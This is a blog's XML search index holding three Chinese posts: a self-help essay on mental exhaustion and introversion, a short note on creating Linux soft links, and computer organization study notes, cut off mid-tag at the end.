<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>精神内耗</title>
      <link href="/2023/12/29/%E7%B2%BE%E7%A5%9E%E5%86%85%E8%80%97/"/>
      <url>/2023/12/29/%E7%B2%BE%E7%A5%9E%E5%86%85%E8%80%97/</url>
      
        <content type="html"><![CDATA[<p>精神内耗是什么？</p><p>通俗地讲，就是<strong>自己内在的两个小人在打架，内在冲突，心累得很。</strong></p><p>曾经的我就是内耗本耗，所以当看到这个问题时，超级认真地回忆过往、翻找资料、整理、思考、总结，前后用了将近 8 小时才写出了这份 5000 字完整答案，希望你能慢慢看下去，对你有所帮助。</p><p>或者你跳着看也行，都有小标题，很容易找出你感兴趣的点，解决你的具体疑惑。</p><p>首先我认为，内向的人，不一定精神内耗就很严重。</p><p>而是<strong>高敏感、低自尊，对事高期待、对己严要求，表达能力和意愿不强，又不敢争取、惧怕冲突和斗争的人，精神内耗会很严重！</strong></p><p>简言之，精神内耗是内在情绪和多重利益互相冲突的结果。</p><p>而精神内耗严重的人，有可能同时就是个内向的人。</p><p>更进一步可以说，内向且高敏感的人，可能精神内耗相对来说更为严重。</p><p>那么首先，我们来看看，如何正确理解「内向」。</p><h3 id="一-什么是内向如何正确辨别你是内向还是外向"><a class="markdownIt-Anchor" href="#一-什么是内向如何正确辨别你是内向还是外向">#</a> 一、什么是内向？如何正确辨别你是内向，还是外向？</h3><p>很多人对内向的误解是：某一刻看到一个人嘴巴笨拙、不善表达，或者没怎么主动开口说话，好像不喜欢说话，就断定这是个内向的人。</p><p>其实不一定。</p><p><strong>对内向的正确理解是：一个人能更多地从独处中获得能量，我们就说他是个偏内向的人。相反地，外向就是一个人能更多地从各类人际交往的活动中获得能量。</strong></p><p>具体来说，内向表现为：不管一个人独处时是在发呆、睡觉、看电视，还是在一个「独立空间」里阅读、学习或者写作工作之类，只要当他不需要去跟其他人交际、沟通、妥协、面对面合作，可以避开他人的眼光和当下评价，他就能逐步恢复身体疲劳和心理疲惫，获得能量，提升能量值。我们就说这是一个相对内向的人。</p><p>而且内向也不是亘古不变的，它是人一段时间内的心理状态，有时候人也有可能从偏内向转变为偏外向，外向的人也有可能转变为内向，大概是因为一些重大事情或是契机，或是自然而然的状态流动。当然，这种转变情况发生地很少，总体来说，在性格图谱中，你是偏内向还是偏外向，基本是一个比较稳定的的状态。</p><p>而且，内向的人并不是不喜欢参加聚会和活动，并不是不能在人前侃侃而谈，并不是不能进行公众讲话表达。</p><p>而是相对来说，在参加聚会、活动、公众表达时，他是一种在消耗能量的状态，进行完这些活动后，他会感受到自身能量值降低了，他更需要通过休息（独处）来恢复。</p><p>所以一个内向的人，主观上一般不太能高频率地参与社交活动。他需要做到独处时间比参加聚会活动表达的时间多，这样他才能保证自己能量值充沛，让自己处于一种精神相对轻松的状态，也才能相对正常和谐轻松地工作和生活。</p><p>但是在现实里，很多人并不理解内向者的本质，总认为他们较少主动与人交际和参加活动就是木讷、扭捏、不大方、有缺陷、没本事、看不起人…… 于是父母从小便会推着话少的孩子在亲戚朋友面前各种「嘴甜」、主动打招呼、表演节目，希望训练孩子成为积极阳光大方的「正常人」；内向者长大后也可能会迫于社会、生存和工作等压力，参加一些本不愿意涉及的活动、会议、交际，而稍微过度变便容易造成精神内耗。</p><h3 id="二-怎么理解精神内耗长期精神内耗对人有哪些危害"><a class="markdownIt-Anchor" href="#二-怎么理解精神内耗长期精神内耗对人有哪些危害">#</a> 二、怎么理解精神内耗？长期精神内耗对人有哪些危害？</h3><p>精神内耗也叫心理内耗，指<strong>人的自我控制</strong>需要消耗心理资源，当心理资源不足时，个体就处于内耗状态。</p><p>通俗地说，当你不是因为干体力活身体劳累觉得疲劳，也不是因为脑力工作、加班通宵这种客观的劳累造成的疲劳，而是由于「心理上的一种主观感受」，让你觉得很累，那么你就处于一种所谓内耗的状态。</p><p>而<strong>长期的内耗会让人觉得很疲惫。</strong></p><p>比如说：经常觉得累，觉得压力大，但客观上其实也没干什么；不知道自己到底想要什么，或者说有时候清楚了自己想要什么，有了努力方向，但都还没怎么行动呢，就累了。</p><p>以及，跟人相处、人际交往或者亲密关系中，当双方遇到意见不一致或是矛盾冲突时，你容易猜疑臆测对方对你的看法、对事情的想法，不能心平气和地表达清楚自己的想法和观点，而更多地选择生闷气，而非沟通和行动解决矛盾冲突。</p><p>这些都是一种对自我心理的消耗和磨损。长期下去就会造成严重精神内耗。</p><p><strong>不要小瞧这种主观的损耗，它对我们的健康其实有很大影响。</strong></p><p>小的方面，精神内耗会影响人的自我评价、做事意愿和效率、睡眠质量，甚至让人失眠，遇事裹足不前，因畏缩犹豫不自信而表现不佳、错失机会；</p><p>大的方面，高血压、冠心病及肿瘤等疾病，虽然病理较为复杂，但一般与精神心理有密切关系。</p><p>医学心理学研究表明，如果心理内耗长期存在，得不到疏导，会造成抑郁情绪、精神萎靡、精神恍惚甚至精神失常，还会引发多种身心疾患。而常见的偏头痛、高血压、缺血性心脏病等疾病，也都与心理损耗有很大关系。</p><p>但由于这种损耗是一种长期的、潜移默化的过程，所以，又极易被人们忽视。正因此，有人将心理损耗称作现代职场人的「隐性杀手」。</p><h3 id="三-造成精神内耗的原因是什么"><a class="markdownIt-Anchor" href="#三-造成精神内耗的原因是什么">#</a> 三、造成「精神内耗」的原因是什么？</h3><p>造成精神内耗的原因是复杂的，有内在原因和外在原因，以及内外多重因素互相影响造成，通过个人体验反思和查资料总结，得出以下最重要的 5 种原因：</p><h3 id="1高敏感低自尊过度自我关注"><a class="markdownIt-Anchor" href="#1高敏感低自尊过度自我关注">#</a> 1. 高敏感，低自尊，过度自我关注</h3><p><strong>自尊</strong>是一个人对自己整体的看法：我们如何评断或评价自己，以及我们赋予自己作为人的价值。它是一个人活着的「底气」，对于一个人的心理生存至关重要。</p><p>自尊水平高 / 拥有健康自尊的人，能对自己形成较为全面且平衡的认识，不会因为某件事没做好、某个人不喜欢自己，就以偏概全得出「我很差」的结论，ta 能够看到自身价值，能同时接受自己的优点和缺点，很清楚是否喜欢真实的自己，能活得较为自洽和轻松。</p><p>而<strong>低自尊</strong>，指一个人对自己的内在整体评价是负面的，是一种对自己不认可、不接纳、不认同的负面信念和情绪。而不管这个人的外在成绩有多么醒目和让人羡慕，或者，他本身就是默默无闻的普通人。总之内在的他很累，很矛盾，他容易因为一两件事没做好就觉得自己什么都做不好，也不接受自己的缺点和不足，想要成为完美的绝对优秀的人，于是现实不如意时很容易产生自我怀疑和自我否定。</p><p><strong>高敏感</strong>呢，是一个人的感官能力过强（遗传特质，后天基本无法改变），他能「看见」身边人和事微小的变化、波动，对身体、情感、社会刺激都异常地敏感。如果不对自己的敏感加以控制，一点小事就能牵动他的神经，过度思虑，造成精神内耗。</p><p><strong>当高敏感撞上低自尊，<strong>人就很容易产生</strong>自卑心理</strong>，进而 **「过度自我关注」**：ta 会过分关注他人的眼光，过分在意他人对自己做某件事的关注，过分在意他人对自己的看法评价。经常会不自觉地思考「我刚才的表现是不是不太好呢」「他是怎么看我的」「他会不会觉得我很差 / 难当大任 / 懦弱 / 好欺负」「他会因此喜欢我 / 讨厌我 / 踩我一脚 / 伤害我 / 阻碍我吗」之类，内在无时无刻不在冲突打架，造成心理损耗。</p><p>又因为心思和精力都消耗在内在冲突打架上，人也就难以把时间和注意力专注在原本的学习、工作等重要事项的解决上，而后者造成的消极后果会进一步导致严重精神内耗。</p><p><strong>看到这里你也许会懵，这明明是过分在意他人，怎么能叫「过度自我关注」呢？</strong></p><p>那是因为，「太过在意别人看法」，本质上就是「过度的自我关注」。</p><p>因为其实 ** 在人性原则上：每个人最在意的都是他自己。** 别人没那么在乎你，也没那么关注你。实际上，每个普通人能投注、会投注在其他人身上的心思真的非常有限、非常小。</p><p>打个比方，每个人有 100 分注意力，那么大概 50~70 分自动投注在自己身上，20~40 分投注在家人、伴侣、亲密朋友身上，只有不到 10 分注意力，还要分给很多个「其他人」。</p><p>你可以问问自己，你对别人有多少真正的看法呢？即便某时你对某个人有些看法，但这个看法又能持续多久呢？你每天都在时时刻刻关注着别人的一举一动，等着给他打分、评价他，以此决定他的升职加薪还是生死存亡吗？你的目光和看法真能实质影响多少人的一分一毫呢？</p><p>答案是否定的。</p><p>所以，反过来也一样，根本没有几个「别人」会真的在意、关心你，就算他对你有点似有若无的看法，也不能隔空操控和影响你。</p><p>而你无时无刻不在关注、在意着他人，实在是没有必要也不值当啊。</p><p>所以说，过分在意他人的实质根本不在于别人怎么看你（那不是真的重要），而是你自己将别人对你的看法看的太重要了，将别人对你的看法所导致的后果看的太重要。</p><p>然而因为「你想象中他人对你的在乎、关注及其影响」，你变得畏首畏尾、恐惧担忧，变得有点神经质，这让你总没法把注意力和精力能量更多地放在实实在在的重要事情解决上，从而耽误自己学习、工作进展，也就掉进了严重精神内耗的漩涡里了。</p><h3 id="2人际关系中的猜疑妒忌讨好多种利益和情绪互相冲突"><a class="markdownIt-Anchor" href="#2人际关系中的猜疑妒忌讨好多种利益和情绪互相冲突">#</a> 2. 人际关系中的猜疑妒忌讨好，多种利益和情绪互相冲突</h3><p>同期进公司的同事升职了，而他干的活没我多，做的项目成绩明明还没有我的好，为什么领导偏爱他？</p><p>跟暧昧的男生表白了，但他拒绝了我，然而当初聊天好几个月，感觉他对我有好感的，为什么呢？好伤心啊，他到底喜不喜欢我？我要不要再努力一下？</p><p>父母是真的爱我吗？如果真的爱我，为什么不能理解我现在工作压力很大、自顾不暇、也没多少钱，却只顾着催结婚催相亲，好像只要结婚证一领，所有问题都自动消失似的，这怎么可能呢！</p><p>老伴为什么只顾着自己潇洒，看不到我每天做家务的辛苦，却总挑刺我饭菜做得这不好那不好吃的？一点不合他意就找茬吵架，然后不吃饭，我真的很受伤，谁懂我！还要我低头认错般哄他吃饭，哎，可是又怕他饿坏了，就左也不是右也不是，我动不动失眠！</p><p>……</p><p>以上如此总总，让人自己跟自己打架，造成精神内耗。</p><h3 id="3内卷时代的高强度过度竞争同辈压力父母期待"><a class="markdownIt-Anchor" href="#3内卷时代的高强度过度竞争同辈压力父母期待">#</a> 3. 内卷时代的高强度过度竞争，同辈压力，父母期待</h3><p>不知不觉我们就踏入了内卷时代，因为总体资源就那么多，来竞争的人却高了好多倍，所以不是每个人都能抢到，穷人不再容易翻身，读大学不意味着好工作，毕业即失业、工作三五年还月薪不到 8000 块的人比比皆是，而你就在其中。</p><p>曾经同窗多年的同学朋友，已经升职加薪且买房了，而你还在为快 30 岁了，会不会被辞退而恐惧，也为已经适应不了 996 工作强度的身体而担忧。</p><p>别说哪天能结婚了，恋爱都没得谈，也没时间心思去想，毕竟当你看到海淀鸡娃时就只觉得自己不配，如果给不了孩子一个设身处地你自己愿意走一遭的人生，那还不如不带 ta 出生，真不忍心害人害己，不如好好养育自己，多实现一点点人生可能性。</p><p>对于父母亲戚的期待和催婚，对不起，你没能力，只能离他们远点，暂时应付过去。</p><p>自己的人生自己决定，结果好坏也只能自己承担。</p><p>话虽这么说，但仍然压力山大，造成精神内耗。</p><h3 id="4将焦点更多地放在了不可控的结果上"><a class="markdownIt-Anchor" href="#4将焦点更多地放在了不可控的结果上">#</a> 4. 将焦点更多地放在了不可控的结果上</h3><p>当你接到一个有挑战的工作任务，或者面对一个感兴趣的领域想要学习时，你首先做的不是熟悉任务职责和了解领域基础知识，分解挑战，做阶段性规划，而是想这想那、患得患失，把本应用于初启动的时间和精力全浪费在了紧张的空想和恐惧中，各种担忧结果，总认为自己做不到、做不好。</p><p>这样辗转反侧，左顾右盼，前怕狼后怕虎，不但对解决问题起不到任何作用，而且还会自缚手脚，自设障碍，从而产生拖延心理，迟迟不行动，进而产生精神内耗。</p><p>精神内耗还会反向造成拖延，从而恶性循环，苦果难尝。</p><h3 id="5个人对事物的高期待-对自身的高标准严要求想得太多而行动太少"><a class="markdownIt-Anchor" href="#5个人对事物的高期待-对自身的高标准严要求想得太多而行动太少">#</a> 5. 个人对事物的高期待、对自身的高标准严要求，想得太多而行动太少</h3><p>每天也没闲着，也没怎么休息，但是就是没什么产出，很苦恼。</p><p>接受不了随便做出来的东西，比如当你看到别人瞎几把写出的文章，里边主要信息不全面、观点不可靠、举例脱离现实、结论不严谨等等，你竟然会替作者脸红，心想我写的东西肯定比这个好，然而自己却迟迟没动笔。</p><p>简直是拖延症晚期患者，因为自身的完美主义倾向作祟，因为对自己的期待很高，总是思考很多但行动很少，长此以往，造成严重的精神内耗。</p><h3 id="四-如何减少改善摆脱-对自己的精神内耗"><a class="markdownIt-Anchor" href="#四-如何减少改善摆脱-对自己的精神内耗">#</a> 四、如何减少 / 改善 / 摆脱 对自己的精神内耗？</h3><p>每个人或多或少都会被精神内耗困扰，从而影响工作和生活，痛苦不已，那么怎么做可以改善对自己的精神内耗呢？针对性的 5 种方法，希望能对你有所帮助。</p><h3 id="1克服低自尊平衡看待他人和自己自我接纳"><a class="markdownIt-Anchor" href="#1克服低自尊平衡看待他人和自己自我接纳">#</a> 1. 克服低自尊，平衡看待他人和自己，自我接纳</h3><p>他人没你想象中的那么幸福或不幸，你也没有多么糟糕或者多么天赋异禀。没有人是完美无缺的人，你的目标和期待也不该是完美和绝对优秀。</p><p>所以，修正对于世界、他人和对自己的认知，系统思考，平衡地看待自己极为重要。</p><p>接纳和发扬自己的优点，同时也学着接纳自己的缺点。以及，并非所有大众眼中的「缺点」都需要改变，有些缺点其实不碍人不碍事，比如内向，接受它就好了，试着避开因它导致的坏事情，以及发扬它的长处。</p><p>总之，要改变自己长期错误的思维方式，正确认识自己，削弱负面的自我评价，慢慢喜欢上自己，形成正面的自我信念。</p><p>当然，提升自尊需要付出足够的努力，要你经常自我提醒和进行相关实践。（推荐书籍《克服低自尊》）</p><p>高敏感因遗传而来，不是你想改就能改的，但是它给人带来的好处，其实是一种天赋，可以好好利用。因它造成的负面影响，我们只要事先尽可能地避开或抑制就好了。</p><p>环境方面，高敏感者对声音、光线及对自己的身体感觉极为敏感，只要一天晚上没睡好，那第二天就全废，几乎做不成任何事。就算是精力最充沛的 20 岁，也受不了偶尔的熬夜通宵和失眠。那么，尽可能地选择较为安静的居住环境，不要跟非敏感以及同理心差的人合租，否则晚上 12 点了，你要睡了，对方却精神抖擞要开灯熬夜，免不了磕磕碰碰，你睡不着，被吵醒，那就完了。最重要的是，尽量形成规律作息，睡够觉，不要熬夜和缺觉。</p><p>社交方面，高敏感的人常常不自觉过度在意他人眼光和评价，以及难以拒绝和反击他人。你要认识到自己这个特性，然后加以主观抑制和调整。</p><p>当敏感特性在细微琐碎日常小事上随意游走而消耗你的精力时，觉察到这一点就立刻提醒自己：停下来。</p><p>大多时候你根本没必要在意他人的眼光和对你的看法，认识到「每个人最在意的都是他自己」，「没有几个人会特别在意和关注你」。很少时候你才需要很在意某个人的看法。但过分在意某人眼光和看法其实是不解决问题的，反而造成内耗，成为做事的阻力，因为解决具体实际事情才是最根本的。</p><p>那么，当别人对你造成干扰了应该怎么做呢？</p><p>请及时指出来「你进进出出开关门很大声、有事没事总敲我一下，影响我学习了，别再这么做了」，而不要自己内心各种权衡纠结「我说出来他会不会觉得我敏感活该、小题大做、没事找事、不友好、变本加厉干扰我」。因为也许人家根本不知道他的行为干扰了你，而只要你指出来，他知道了，也就改了，你也就能安心专注于学习了。万一他就是不改、有意干扰你，那你更不能这样下去，要么避开对方，不要在一个空间学习，要么正义反击以解决冲突。总之，别光纠结不行动。</p><p>而高敏感者的觉察感知能力、深度加工能力、极高的同理心等，可以用在对特定事情的观察和解决上，对自己某种能力的修炼上。比如高敏感者对人和事的观察天生比别人更细微和透彻，更善于整理、思考、深度沟通，那么考虑写作，或者分析咨询相关的工作，岂不是更好？（敏感篇回答已更新，有需要的可以去主页查看）</p><p>总之，接纳真实的自己，肯定自己，平衡得看待自己，逐渐提升自我价值感 / 自尊，善用敏感天赋，可以慢慢减少甚至彻底摆脱精神内耗。</p><h3 id="2换一种角度看人际关系敢于表达-争取和斗争"><a class="markdownIt-Anchor" href="#2换一种角度看人际关系敢于表达-争取和斗争">#</a> 2. 换一种角度看人际关系，敢于表达、争取和斗争</h3><p>当你讨厌一个人的时候，不妨去找一些利己的理由，比如，去观察一下他的优点，看能否学习，这样做也许有利于自我的提高，也会让你开始对他有所接纳。同时，你的态度，很可能会得到他良好的回应，到最后，可能你与对方的关系真的和谐了。万一对方就是不友好，继续找你茬，那你就当他是空气、是傻子，避不开的合作和沟通尽量好好进行，但不要有任何其他接触，以免让自己不舒服。</p><p>而对于过分在意他人的想法和评价，如果有利益关系的领导，不如拿着自己的工作成绩，开诚布公地找他沟通，问自己离升职加薪有多远，要敢于争取；如果是一起生活的伴侣，那更要敢于表达自己内心的感受、对他做法的看法、对他的期待，家务分工之类的事情，绝对需要你的斗争才有可能走向合理。</p><p>最后，如何做到不过分在意他人眼光和看法？要修炼「被讨厌的勇气」，自己接纳自己就够了，他人的期待、评价、建议都只是参考而已，有用的吸收，过分的丢掉，总之不要太在意。何况他人其实最在意的也是他自己。</p><p>注意，修炼「被讨厌的勇气」并不是说让你故意去做让别人不爽的事，去吸引被讨厌的负向能量，而是说，如果这是我想要做的事情，那么就勇敢去做，而不要因过分在意社会及他人的眼光和可能的不好评价而畏缩和犹豫。</p><h3 id="3寻找自己的工作热情所在开辟一条自己的路尽量不参与过度竞争"><a class="markdownIt-Anchor" href="#3寻找自己的工作热情所在开辟一条自己的路尽量不参与过度竞争">#</a> 3. 寻找自己的工作热情所在，开辟一条自己的路，尽量不参与过度竞争</h3><p>要认识到大众的追求不一定是你内心的真实追求，如果努力一把后够不上大众眼中优越的学校和工作，不如多看看自己的热情在哪里，只有实实在在的欢喜才是自己的。</p><p>只挣一份能养活自己的薪水，但没有上班焦虑而乐在每一天的工作中，也不失为一种幸福。</p><p>总之，去寻找自己的工作热情所在，开辟一条属于自己的路，踏实在每天的一饭一蔬中，散个步、睡个好觉、做好今天手头上的事，那就是好的生活。</p><p>至于父母抱怨你为什么还不结婚？</p><p>让他们闭嘴吧，「这是我自己的人生课题，请你们不要再指手画脚，因为你们不可能为我人生负责的，只有我自己能为自己负责。」</p><p>离父母远点，孝，但请别盲目「顺」，独立生活，「为自己负责」你要做到言行一致。</p><p>以及，不跟（少跟）他人比较，远离同辈压力，每天努力一点点，争取比昨天的自己优秀就好了。自己对自己的看法才是最重要的。</p><p>当然，人作为社会动物，没法绝对不在意他人看法和评价、不参与竞争，生存问题总要解决，社交需求也客观存在，所以说，这个问题不是一时半会可以解决的，与之友好相处好了，时时调整自己。</p><h3 id="4不执念于结果多关注过程制定小目标积极行动"><a class="markdownIt-Anchor" href="#4不执念于结果多关注过程制定小目标积极行动">#</a> 4. 不执念于结果，多关注过程，制定小目标积极行动</h3><p>心理学上说，当人面对一个富有挑战性的任务，你会去幻想任务完成时的美丽图景，这对你实现任务是有些许动力加成的。然而，当你过度限于任务完成图景、执念于结果时，却是你开启行动的最大阻力。</p><p>所以，用几分钟想象任务完成的美好图景后，就立马将心思拉回到任务过程吧。</p><p>面对挑战性大的任务时，因为践行过程复杂，人会产生巨大压力，便难以立即行动，初始行动力很弱。我们也有体验，一旦事情被拖到最后，我们往往能集中注意力去做任务，尽管这时候可能时间不够了，也做不到很好了，但在此之前，我们却「动」不起来，白白耗费很多时间和精力。心理学家认为，人们只有在接近目标的期限时，才能集中注意力去完成，这被称为「期限效应」。</p><p>因此，想要更高效高质量地完成一项任务时，不妨先将任务拆解成阶段性的<strong>小目标</strong>（有多小？——<strong> 小之又小</strong>。指下边的每一步都只需要你执行，不需要你再思考「怎么做」）。这样一来，每一个阶段性小目标的「最后期限」将被提前，那么我们行动的初始动力就会提升，以促使我们积极行动，完成一个一个小目标，进而改善心理耗损。</p><h3 id="5做出决定后就只专注于做行动是改善精神内耗的最佳方法"><a class="markdownIt-Anchor" href="#5做出决定后就只专注于做行动是改善精神内耗的最佳方法">#</a> 5. 做出决定后就只专注于「做」；行动，是改善精神内耗的最佳方法</h3><p>放弃思考不是一种选择，逃避面对也不是解决问题的真实方法。</p><p>面对人生重大抉择，或一项有挑战的任务时，保持高期待是好的，对自己严要求也是没错的，但是当你深思熟虑做出理性选择和行动步骤后，就不要再思虑其他，只专注于「做」就够了。</p><p>行动，永远是改善精神内耗的最佳方法，是一剂破解焦虑的良药。</p><p>俗话说，三思而后行，其实比「思考」更重要地是思考过后的「行动」。与其思前想后，食无味、寝难眠，不如撸起袖子加油干，因为只有行动才能收获一个接一个的踏实结果。</p><p>而越是恐慌越是怕，越是拖着不行动，精神内耗的漩涡就越滚越大。</p><p>所以，快快行动吧。</p><h3 id="五-总结"><a class="markdownIt-Anchor" href="#五-总结">#</a> <strong>五、总结</strong></h3><p>精神内耗分为纯粹主观的人和情绪之间的「自我内耗」，这或许是造成大多人严重精神内耗的根本原因；再在人的基础上，掺和上事情、问题、拖延、逃避等，就是人、自己、情绪、事情这种大杂烩而成的内耗。</p><p>我认为，理解和解决前者是最核心最重要的，也是我们自己更有能力更有可能去解决的，回报率最高的。在此基础上，自我融洽了，情绪积极了，那再去解决具体问题和困难，也就更容易了，那你离摆脱精神内耗也就不远了。</p><p>总之，处在精神内耗中的人是很辛苦的，内在冲突，自己跟自己打架，受伤的全是自己，耽误的却是正事，想想都难受。</p><p>所以，希望以上解答能帮助你认知自我、改善精神内耗、走出精神内耗，拥有更和谐自洽的内心世界，更幸福快乐的个人生活。</p>]]></content>
      
      
      <categories>
          
          <category> 思考 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LINUX学习</title>
      <link href="/2023/12/15/LINUX%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/12/15/LINUX%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h5 id="软连接"><a class="markdownIt-Anchor" href="#软连接">#</a> 软连接</h5><p>本质上是为某一个文件在另一个位置建立一个同步的链接。本质上可以说是 windows 里的快捷方式。</p><blockquote><p>ln -s target source<br>ln -s：表示创建一个软连接；<br>target：表示目标文件（夹），​​​​​​​即源文件。<br>source：表示当前目录的软连接名，即被创建出来的软连接名称以及放置在何处。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> LINUX </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机组成原理-概念</title>
      <link href="/2023/12/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E6%A6%82%E5%BF%B5/"/>
      <url>/2023/12/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这个 blog 主要是总结复习过程中计组见到的题目中或 ppt 中较重要的相关知识点。这里总结好记录的概念知识点。</p></blockquote><h1 id="第一章-计算机系统"><a class="markdownIt-Anchor" href="#第一章-计算机系统">#</a> 第一章 计算机系统</h1><h3 id="基础概念"><a class="markdownIt-Anchor" href="#基础概念">#</a> 基础概念</h3><p><strong>冯诺依曼计算机的三大要点</strong><font color="red"> （重点） </font></p><ul><li>计算机由五大硬件部分组成：运算器（核心部件 ALU），控制器，存储器（粗略的分为内存（主存）+ 外存（辅存）），输入设备，输出设备</li><li>灵活使用二进制（指令和数据用二进制表示 -&gt;）</li><li>采用<strong>程序存储</strong>的工作方式（按地址访问存储的指令并<strong>顺序执行</strong>）<br>其余特点：</li><li>指令和数据以同等的地位存放于存储器内并可以按地址寻址。（区分指令和数据的方式 -&gt; 按周期）</li><li>这时机器以<strong>运算器</strong>为中心，输入输出设备与存储器的数据经传送经过运算器</li><li><strong>基本工作方式</strong>：控制流驱动方式（按地址访问并顺序执行指令）<br><strong>计算机器件组成</strong><br><strong> CPU</strong> -&gt; 运算器 + 控制器 +（Cache）    <strong>主机</strong> -&gt;CPU + 主存（运算器 + 控制器 + 存储器） <strong>计算机系统</strong> -&gt; 配套的硬件设备和软件系统<br><strong>计算机系统的软件结构</strong></li><li><strong>系统软件</strong>：操作系统，数据库管理系统（注意数据库系统 = DBMS+DBA+… 不属于系统软件），标准库程序，编译程序</li><li><strong>应用软件</strong>：办公软件（OA-&gt; 数据处理）<br><strong>一些题目中的知识点</strong></li><li><strong>MAR 的位数为地址码长度（存储单元数量），MDR 的位数为存储字长（存储单元大小）</strong></li><li><strong>控制器</strong>可区分存储单元中存放的是指令还是数据</li><li>计算机存储数据的基本单位是<strong>字节</strong>，最小数据单位是<strong> bit 比特</strong></li><li>计算机中所有信息均以二进制表示的理由是<strong>物理器件性能导致</strong></li></ul><h3 id="计算机层次结构"><a class="markdownIt-Anchor" href="#计算机层次结构">#</a> 计算机层次结构</h3><p><img src="https://img-blog.csdnimg.cn/42333c69b090473bb6a6fff0a610562f.png" alt="层次结构"></p><ul><li><strong>高级语言</strong>：C++，JAVA 等，需要先通过编译程序编译为汇编语言，再转换为机器语言，或直接转化为机器语言。</li><li><strong>汇编语言</strong>：需通过叫做汇编程序的系统软件转化为机器语言。（用主给付编写的语言）</li><li><strong>机器语言</strong>：计算机唯一能直接识别和执行的语言。<br><strong>三个翻译程序</strong></li><li>汇编程序：将汇编语言转化为机器语言</li><li>解释程序：将原程序中的语句按执行顺序翻译为机器语言并立即执行</li><li>编译程序：将高级语言翻译成汇编语言或者机器语言<br><strong>别的概念</strong></li><li>层次间的依存关系是：上层实现对下层的功能扩展，下层是上层实现的基础</li><li></li></ul><h3 id="计算机性能指标"><a class="markdownIt-Anchor" href="#计算机性能指标">#</a> 计算机性能指标</h3><p><strong>1，机器字长</strong><br>指依次进行运算所能处理的二进制数据的位数。这里讲一下不同字长的关系</p><ul><li><strong>机器字长</strong>：即 CPU 内部用于整数运算的数据通路的宽度，反映了计算机处理信息的能力。</li><li><strong>指令字长</strong>：一个指令字中包含的二进制代码的位数。</li><li><strong>存储字长</strong>：一个存储单元存储的二进制代码的长度。等于 MDRDefinitely 位数<br>注意：指令字长一半都取存储字长的整数倍，这样如果指令字长是存储字长 2 倍，则需要 2 个访存周期来取出一条指令。若相等，则取指周期等于机器周期。<br><strong>2，运算速度</strong><br>运算速度受多种因素影响，且评判指标也不同。</li><li>吞吐量：在给定时间内，一台计算机所能完成的总的工作量。</li><li>响应时间：计算机从接收数据到输出结果的时间间隔。</li><li>主频：时钟频率，HZ 为单位，1HZ 表示每秒 1 次。CPU 时钟周期 = 1 / 主频。</li><li>CPI：即执行一条指令所需要的时钟周期数。</li><li>MIPS：每秒执行多少万条指令。</li><li>MFLOPS（每秒执行多少万次浮点运算）,GFLOPS（每秒执行多少十亿次浮点运算）…<br><strong>3， 可靠性<br> 4，可维护性<br> 5，性价比</strong></li></ul><h3 id="一些可能比较容易错的"><a class="markdownIt-Anchor" href="#一些可能比较容易错的">#</a> 一些可能比较容易错的</h3><p>1，在 CPU 的寄存器中，<strong>指令寄存器</strong>对用户是完全透明的。</p><ul><li>解释： 首先， <code>透明</code> 在计算机领域通常是指存在但不干预，即：计算机中存在的，但对于某些人员而言又不需要了解的东西。 下面讲述下所有寄存器对用户。</li><li>汇编程序员可以通过指定待执行指令的地址来设置 PC 的值，状态寄存器。通用寄存器只有汇编程序员可见，才能实现编程。而<strong> IR，MAR，MDR</strong> 是 CPU 的内部工作寄存器，对程序员均不可见。<br>2，当前设计高性能 CPU 的重要技术途径是<strong>采用并行处理技术</strong>。<br>3，计算机 “<strong>运算速度</strong>” 是指每秒能执行多少条指令。<br>4，<strong>ALU 和通用寄存器</strong>的<strong>位数（宽度）</strong> 一定与机器字长相同。</li></ul><h1 id="第二章-数据的表示和运算"><a class="markdownIt-Anchor" href="#第二章-数据的表示和运算">#</a> 第二章 数据的表示和运算</h1><h3 id="注意知识点"><a class="markdownIt-Anchor" href="#注意知识点">#</a> 注意知识点</h3><h5 id="1如何判断浮点数的溢出上溢和下溢是否同样处理"><a class="markdownIt-Anchor" href="#1如何判断浮点数的溢出上溢和下溢是否同样处理">#</a> 1，如何判断浮点数的溢出？上溢和下溢是否同样处理。</h5><p>根据阶码来判断，当阶码大于最大正阶码时，为上溢，按出错处理；当阶码小于最小负阶码时，为下溢，按机器零处理。</p><ul><li>规格化浮点数的目的主要是为了增加数据的表示精度，充分利用尾数的有效数位，统一表示格式。</li></ul><h5 id="iee754标准"><a class="markdownIt-Anchor" href="#iee754标准">#</a> IEE754 标准</h5><p E-127="">格式为(-1)^S\times1.M\times2^</p><ul><li>32 位单精度格式： 1 位符号位 + 8 位阶码 + 23 位尾数</li><li>64 位双精度格式： 1 位符号位 + 11 位阶码 + 52 位尾数<br><strong>变行补码</strong> 即双符号位的数，可以判断补码计算时是否溢出，01 表示整数溢出，10 表示负数溢出</li></ul><h1 id="第三章-存储系统"><a class="markdownIt-Anchor" href="#第三章-存储系统">#</a> 第三章 存储系统</h1><h3 id="存储器概述"><a class="markdownIt-Anchor" href="#存储器概述">#</a> 存储器概述</h3><h4 id="存储器分类"><a class="markdownIt-Anchor" href="#存储器分类">#</a> 存储器分类</h4><h5 id="一按照存储介质分"><a class="markdownIt-Anchor" href="#一按照存储介质分">#</a> 一，按照存储介质分</h5><h6 id="1半导体存储器"><a class="markdownIt-Anchor" href="#1半导体存储器">#</a> 1，半导体存储器</h6><p><strong>静态存储器</strong>：利用触发器的双稳态<br><strong>动态存储器</strong>：MOS 管栅极有无电荷来表示二进制的 0/1<br><strong>2，磁表面存储器（磁带，磁盘）</strong><br><strong>3，光存储器（光盘）</strong></p><h5 id="二按照存取方式分"><a class="markdownIt-Anchor" href="#二按照存取方式分">#</a> 二，按照存取方式分</h5><h6 id="1随机存储器ram"><a 